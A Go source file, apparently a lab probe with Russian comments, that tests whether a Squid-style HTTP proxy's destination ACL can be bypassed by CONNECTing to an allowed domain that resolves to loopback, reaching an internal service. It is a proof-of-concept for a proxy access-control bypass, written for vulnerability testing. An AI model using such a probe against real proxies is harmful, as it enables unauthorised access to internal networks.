package main

import (
	"io"
	"log"
	"strings"
	"time"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseRunFlags(args)
	if err != nil {
		return 2
	}
	return executeRun(o)
}

func executeRun(o runOpts) int {
	succeeded, err := runAttack(o)
	if err != nil {
		log.Printf("run: %v", err)
		return 1
	}
	if succeeded {
		return 1
	}
	return 0
}

// runAttack: true если bypass дошёл до lab (уязвимость).
func runAttack(o runOpts) (bool, error) {
	if o.runControl {
		log.Println("=== control: CONNECT на литерал loopback (ожидаем deny dst) ===")
		runCONNECTProbe(o.proxyAddr, o.controlConnect, o.proxyUser, o.proxyPass, "control", true)
	}

	log.Println("=== bypass: CONNECT на разрешённый домен → DNS на loopback ===")
	bypassHit := runCONNECTProbe(o.proxyAddr, o.bypassConnect, o.proxyUser, o.proxyPass, "bypass", false)
	return bypassHit, nil
}

func runCONNECTProbe(proxyAddr, dest, user, pass, label string, expectDeny bool) bool {
	log.Printf("%s: CONNECT %s → прокси %s", label, dest, proxyAddr)
	status, conn, br, err := dialCONNECT(proxyAddr, dest, user, pass)
	if err != nil {
		log.Printf("%s: %v", label, err)
		if status == 403 || strings.Contains(strings.ToLower(err.Error()), "forbidden") {
			log.Printf("%s: отказ ACL на CONNECT", label)
		}
		if status == 407 {
			log.Printf("%s: нужен -proxy-user / -proxy-pass", label)
		}
		return false
	}
	defer conn.Close()

	log.Printf("%s: CONNECT HTTP 200, пробуем raw PROBE в туннель", label)
	_ = conn.SetDeadline(time.Now().Add(proxyIOTimeout))
	if _, err := io.WriteString(conn, "PROBE\r\n"); err != nil {
		log.Printf("%s: write: %v", label, err)
		return false
	}
	buf := make([]byte, 4096)
	n, err := br.Read(buf)
	_ = conn.SetDeadline(time.Time{})
	payload := string(buf[:n])

	if err != nil && n == 0 {
		log.Printf("%s: read: %v", label, err)
		if expectDeny {
			log.Printf("%s: ожидаемо — deny (часто Forbidden MITM при CA: 200 Established, не TCP-туннель)", label)
		} else {
			log.Printf("%s: обрыв без ответа lab — как у deny; проверьте:", label)
			log.Printf("    • connect=tunnel, ACL из acl.example.squid опубликован")
			log.Printf("    • bypass-connect=localhost:9666 и dstdomain localhost в ACL")
		}
		return false
	}

	line := strings.TrimSpace(strings.Split(payload, "\n")[0])
	if line != "" {
		log.Printf("%s: ответ: %q", label, truncate(line, 200))
	}
	if strings.Contains(payload, labMarker) {
		if expectDeny {
			log.Printf("%s: неожиданно — туннель до lab (dst deny не сработал?)", label)
		} else {
			log.Printf("%s: ПОДТВЕРЖДЕНО — TCP до internal (dst без DNS-резолва)", label)
		}
		return true
	}
	if looksLikeForbiddenPage(payload) {
		log.Printf("%s: HTML Forbidden (ACL deny, не прозрачный tunnel)", label)
		return false
	}
	if n > 0 && buf[0] == 0x16 {
		log.Printf("%s: TLS вместо lab — режим mitm или Forbidden MITM (нужен connect=tunnel)", label)
		return false
	}
	if expectDeny {
		log.Printf("%s: нет маркера lab — трактуем как отказ / не tunnel", label)
	} else {
		log.Printf("%s: маркер %q не получен", label, labMarker)
	}
	return false
}

func looksLikeForbiddenPage(s string) bool {
	s = strings.ToLower(s)
	return strings.Contains(s, "<html") || strings.Contains(s, "forbidden") || strings.Contains(s, "заблокирован")
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}
